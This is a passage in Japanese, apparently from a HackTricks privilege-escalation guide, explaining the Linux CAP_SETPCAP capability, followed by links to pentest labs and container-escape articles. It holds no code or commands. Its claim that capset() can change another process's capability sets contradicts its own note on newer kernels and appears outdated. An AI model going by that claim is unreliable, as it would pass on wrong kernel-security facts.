`CAP_SETPCAP`を持つプロセスは、**自身のpermitted capability setに含まれるcapabilitiesのみを付与または削除できます**。つまり、プロセスは自身が持っていないcapabilityを別のプロセスに付与できません。この制限により、あるプロセスが別のプロセスの権限を自身の権限レベルを超えて昇格させることを防ぎます。

さらに、最近のkernel versionsでは、`CAP_SETPCAP` capabilityは**さらに制限されています**。プロセスが別のプロセスのcapability setsを任意に変更することは、もはやできません。代わりに、**自身のpermitted capability set、またはその子孫のpermitted capability set内のcapabilitiesを減少させる場合にのみ許可されます**。この変更は、capabilityに関連する潜在的なsecurity risksを低減するために導入されました。

`CAP_SETPCAP`を効果的に使用するには、effective capability setにこのcapabilityがあり、対象となるcapabilitiesがpermitted capability setに含まれている必要があります。その後、`capset()` system callを使用して、別のプロセスのcapability setsを変更できます。

まとめると、`CAP_SETPCAP`によってプロセスは別のプロセスのcapability setsを変更できますが、自身が持っていないcapabilitiesを付与することはできません。さらに、security concernsにより、最近のkernel versionsでは機能が制限され、自身のpermitted capability setまたは子孫のpermitted capability sets内のcapabilitiesを減少させる場合にのみ使用できるようになっています。

## 参考文献

**これらの例のほとんどは** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com) **の一部のlabsから引用したものです。そのため、このprivesc techniquesを練習したい場合は、これらのlabsを推奨します。**

**その他の参考文献**:

- [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
- [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

​
{{#include ../../banners/hacktricks-training.md}}
